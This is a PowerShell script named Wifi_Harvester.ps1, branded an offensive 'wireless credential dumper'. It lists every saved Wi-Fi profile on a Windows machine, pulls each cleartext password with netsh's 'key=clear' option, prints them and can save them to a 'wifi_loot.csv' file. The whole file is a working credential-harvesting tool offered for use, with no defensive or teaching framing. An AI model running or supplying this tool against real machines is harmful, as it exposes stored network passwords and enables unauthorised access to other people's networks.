# =============================================================================
# FILE: Wifi_Harvester.ps1
# MODULE: [OFFENSE] WIRELESS CREDENTIAL DUMPER (STABLE)
# ARCHITECT: Navaneethan.P
# =============================================================================

$ErrorActionPreference = "SilentlyContinue"
Clear-Host

Write-Host "===================================================================" -ForegroundColor Cyan
Write-Host "   WIFI HARVESTER | CREDENTIAL EXTRACTION ENGINE" -ForegroundColor White
Write-Host "===================================================================" -ForegroundColor Cyan

Write-Host "   [1/2] Enumerating Saved Profiles..." -ForegroundColor Yellow

$Profiles = netsh wlan show profiles | Select-String "All User Profile"
if (-not $Profiles) {
    Write-Host "   [ERROR] No profiles found." -ForegroundColor Red
    Read-Host "   Press Enter..."
    exit
}

$ProfileNames = $Profiles | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
$Count = $ProfileNames.Count
Write-Host "   [INFO] Found $Count Target Networks." -ForegroundColor Gray
Write-Host "   [2/2] Decrypting Key Material..." -ForegroundColor Yellow
Write-Host ""

# Header
$Header = "{0,-35} {1}" -f "SSID (NETWORK NAME)", "PASSWORD (KEY)"
Write-Host "   $Header" -ForegroundColor Cyan
Write-Host "   --------------------------------------------------------" -ForegroundColor DarkGray

$Results = @()

foreach ($Name in $ProfileNames) {
    # Get details
    $Info = netsh wlan show profile name="$Name" key=clear
    
    # SAFELY Check for Password
    $Match = $Info | Select-String "Key Content"
    
    if ($Match) {
        # Password found
        $Key = $Match.ToString().Split(":")[1].Trim()
    } else {
        # No password found (Open Network or Enterprise)
        $Key = "[OPEN / NO KEY]"
    }
    
    # Print Row
    $Row = "{0,-35} {1}" -f $Name, $Key
    Write-Host "   $Row" -ForegroundColor White
    
    $Results += [PSCustomObject]@{
        NetworkName = $Name
        Password    = $Key
    }
}

Write-Host ""
Write-Host "===================================================================" -ForegroundColor Cyan
Write-Host "   [OPTS] Export to file? (Y/N)" -ForegroundColor Yellow
$Export = Read-Host "   root@harvester:~# "

if ($Export -eq "Y") {
    $Dest = "$PSScriptRoot\..\..\DATA\wifi_loot.csv"
    $Results | Export-Csv -Path $Dest -NoTypeInformation
    Write-Host "   [SUCCESS] Loot saved to: $Dest" -ForegroundColor Green
}

Write-Host ""
Read-Host "   Press Enter to return to Kernel..."